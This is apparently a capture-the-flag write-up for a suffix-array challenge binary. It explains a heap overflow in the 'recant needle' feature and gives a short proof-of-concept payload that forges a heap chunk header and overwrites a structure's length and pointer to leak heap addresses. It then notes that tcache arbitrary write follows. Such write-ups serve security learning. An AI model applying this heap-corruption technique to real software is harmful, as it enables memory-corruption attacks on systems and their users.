# Overview

The binary is an implementation of a suffix array to efficiently search for
needles in large haystack strings. I expected a logical bug in the algorithmic
part, but my teammate informed me about a very easy yet powerful bug so I just
used it instead. I think it's probably unintentional...

# The bug

The bug is triggered when the needle is longer than the haystack in the
`recant needle` feature. By using the proof of concept below we can easily get
a heap overflow.

```  
payload = p64(0)*2 #our data  
payload += p64(0)+p64(0x31) #next heap header  
payload += p64(0x100)+chr(0)

add ("A"*0x10)  
add ('')  
add (payload)  
delete(1)

recant (2, payload+"\x00")  
```

We can overwrite the haystack structure of index 2, so I changed the length to
a long value and its `buf` pointer's least significant byte so that it leaks a
heap pointer.

Afterwards getting a LIBC leak and getting arbitrary write is super easy in
tcache malloc so i'll just skip that part.

# Unintentional Solution?

I looked at other teams' writeups and found out they used a much complex
exploit primitive and used a ptmalloc exploit technique to get arbitrary
write. Based on the scoring (500 point for a heap overflow challenge?) and
other people's opinions I concluded that this bug is most likely
unintentional.

Original writeup (https://github.com/pr0cf5/CTF-
writeups/tree/master/2019/pctf-2019/suffarring).